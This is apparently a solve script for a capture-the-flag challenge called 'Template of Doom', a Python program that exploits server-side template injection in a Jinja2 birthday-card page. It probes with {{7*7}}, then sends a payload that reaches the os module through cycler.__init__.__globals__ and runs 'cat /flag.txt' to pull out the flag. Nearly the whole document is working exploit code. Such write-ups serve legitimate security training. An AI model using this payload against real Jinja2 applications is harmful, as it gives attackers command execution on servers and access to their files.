"""Template of Doom: the name is pasted into a Jinja2 template, so {{7*7}}
shows 49. From any template object you can reach Python's globals:
cycler.__init__.__globals__.os runs commands. The flag is in /flag.txt.
Usage: solve.py [host] [port]"""
import re
import sys
import urllib.parse
import urllib.request

host = sys.argv[1] if len(sys.argv) > 1 else "localhost"
port = int(sys.argv[2]) if len(sys.argv) > 2 else 31081
base = f"http://{host}:{port}/?name="


def card(name):
    with urllib.request.urlopen(base + urllib.parse.quote(name), timeout=10) as r:
        return r.read().decode()


print("{{7*7}} ->", re.search(r"Happy birthday, ([^!]*)!", card("{{7*7}}")).group(1))
page = card("{{ cycler.__init__.__globals__.os.popen('cat /flag.txt').read() }}")
print(re.search(r"flag\{[^}]+\}", page).group(0))
